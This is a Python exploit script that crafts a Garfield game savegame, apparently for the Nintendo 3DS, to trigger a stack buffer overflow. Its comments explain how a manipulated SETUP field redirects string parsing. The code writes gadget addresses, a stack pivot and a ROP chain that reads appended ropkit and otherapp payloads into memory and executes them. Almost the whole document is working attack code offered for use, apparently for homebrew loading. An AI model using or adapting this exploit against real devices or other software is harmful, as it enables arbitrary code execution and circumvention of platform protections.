import os,sys,struct

# This exploit is just a common string buffer overflow into the stack, but getting that to happen took a little finesse. First a little background how the profile strings are parsed.

# In each profile slot (Garfield, John, and Odie) there is a "SETUP" variable towards the end. This value determines where the actual unicode profile string begins (actually it points to STR_ADDR,
# which is the linearmem address of the string). Normally, it's in single digits and it points to data in BSS (approx. addr 0x1c3XXX).
# The formula is roughly "STR_ADDR = 0x1C1A5C + (0x50*SETUP)". 

# The issue here is that this u32 SETUP variable is located in each of 3 profiles, shortly after each profile string. Since the present value (5?) doesn't cover even half of the u32's 4 bytes, 
# it will null terminate all 3 profile strings before they're long enough to crash the stack. How to fix this? Well, as it turns out, the app doesn't care if the SETUP value is large 
# enough to point to the savegame's address in linearmem. In the US version, this is 0x0043f884 (which translates to STR_ADDR = 0x1559c350) and is plenty large enough to cover the two unicode chars that SETUP
# covers. Now we can make the game read a string into the stack that's almost the whole 0x2dc length of the savegame, and that does the trick in crashing the stack. Everything 
# past this step is just starting the rop chain and loading otherapp. Yes there are other non-string vars in the profile slots, but they don't seem to mind being arbitrary values.

# Oh one more thing, the game doesn't allow extra save files other than Garfield.sav. It also doesn't read past 0x2dc, but it will allow more data past that without erasing the save. 
# So we just cat ropkit and otherapp after the savegame and read them into memory after we have control of the stack.

filename="Garfield.sav"
STR_ADDR=0x1559c350 #EUR 0x1559c2d0
SETUP=0x0043f884    #EUR 0x0043f882
STACK_PIVOT=0x00165bac #: mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1  - nice stack pivot but ropkit hates it, so I use a different one for that.
GARBAGE=0x44444444  # 4 is just a pretty number, i like it.
POPPC=0x00114aec
POP_R0PC=0x0015be1c
POP_R1PC=0x00151650
POP_R0R4PC=0x0010974c
ROP_STR_R0TOR1=0x0013b098

FILE=0x00230800     # randomly picked "safe" address for FILE struct (for file handling functions).
FILENAME=0x0ffffe5c # Garfield.sav address
DEST=0x00231000
SIZE=0x00011000     # weird size to make sure non-zero on all byte pairs.
TERM=FILENAME+0x24  # address of savegame filename's null terminator. just beyond the savegame end.
ROP_ADDR=0          # file offset for rop chain increments 4 each rop() call.

MNT=0x00116b8c+4  # savegame mount function
ARCH=0x0FFFFc46   # archive sata: address for fmount
OPEN=0x001521f8+4
READ=0x0011df78+4

SP=0x0ffffcb8 # address of initial rop on stack
PC=POPPC

# these gadgets have to do with fixing issues that occur when placing rop code inside a unicode string (no 00 00's allowed).
READOP_FIX=0x00121c88 # : mov r1, #1 ; str r1, [r0] ; bx lr
TERM_FIX=0x0015b480   # : mov r0, #0 ; str r0, [r4] ; pop {r4, pc} ;

def write32(gadget_addr, file_offset):
	global filename
	with open(filename,"rb+") as f:
		f.seek(file_offset)
		f.write(struct.pack("<I", gadget_addr))
		
def rop(gadget_addr):
	global ROP_ADDR
	with open(filename,"rb+") as f:
		f.seek(ROP_ADDR)
		f.write(struct.pack("<I", gadget_addr))
	ROP_ADDR+=4
	
# initial exploit handling code. the second arg is savegame file offset.
write32(SETUP, 0xf8)
write32(STR_ADDR, 0xb4) #EUR write32(STR_ADDR, 0xac)
write32(POPPC, 0x26e+4)
write32(TERM, 0x26e+8)

# backwards pivot inside savegame to get more space for the below rop() code
write32(POP_R0PC, 0x296+0)
write32(SP, 0x296+4)
write32(POP_R1PC, 0x296+8)
write32(PC, 0x296+12)
write32(STACK_PIVOT, 0x296+16)

# read ropkit into memory and jump to it
ROP_ADDR=0x112
rop(POP_R0PC)
rop(	0x0FFFFcf8)
rop(READOP_FIX)
rop(TERM_FIX)
rop(	GARBAGE)
rop(POP_R0PC)
rop(	ARCH)
rop(MNT)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0R4PC | 0x00000000)  # these 00000000's were for crash debugging : )
rop(	FILE)
rop(	FILENAME)
rop(	0x88888888) # read operation for fopen. it should be 1, but that'd create a null in high 16 bits. READOP_FIX gadget will fill in correct value.
rop(	GARBAGE)
rop(	GARBAGE)
rop(OPEN)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0R4PC | 0x00000000)
rop(	FILE)
rop(	FILE+32)
rop(	DEST)
rop(	SIZE)
rop(	GARBAGE)
rop(READ)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0PC)
rop(	DEST+0x2e0)
rop(POP_R1PC)
rop(	POPPC)
rop(STACK_PIVOT)